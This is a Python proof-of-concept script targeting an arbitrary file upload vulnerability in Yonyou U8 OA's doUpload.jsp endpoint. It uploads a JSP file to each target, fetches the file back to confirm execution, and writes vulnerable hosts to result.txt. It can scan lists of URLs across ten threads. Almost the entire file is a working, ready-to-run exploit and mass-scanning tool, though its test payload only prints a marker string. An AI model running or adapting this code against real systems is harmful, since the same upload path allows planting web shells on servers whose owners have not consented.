# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
import json
from multiprocessing.dummy import Pool
import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                                        tag: this is a 用友U8-OA协同工作系统doUpload.jsp任意文件上传
                                              @version: 1.0.0   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target[:-1]
    else:
        target = target
    path = "/yyoa/portal/tools/doUpload.jsp"
    url = target + path
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Upgrade-Insecure-Requests': '1'
    }

    files = {'iconFile': ('info.jsp', '<% out.println("tteesstt1"); %>')}

    try:
        # conn = http.client.HTTPConnection(target)
        # conn.request("POST", path, body.encode("utf-8"), headers)
        # response1 = conn.getresponse()
        response1 = requests.post(url, headers=headers, files=files, verify=False, timeout=15)

        # print(response1.status_code)
        match = re.search(r'window.returnValue\s*=\s*"([^"]+)"', response1.text)

        if response1.status_code == 200 and match:
            return_value = match.group(1)
            # print(return_value)
            uploadpath = f"{target}/yyoa/portal/upload/{return_value}"
            response2 = requests.post(url=uploadpath, headers=headers, verify=False, timeout=15)
            if "tteesstt1" in response2.text and response2.status_code:
                print(f"[++++++] {target} 存在 任意文件上传,{uploadpath}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(uploadpath + "\n")
            else:
                print(f"[-] {target} 存在 任意文件上传,上传失败")
        else:
            print(f"[-] {target} 未发现")

    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='任何问题+V y1k1ng1227')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
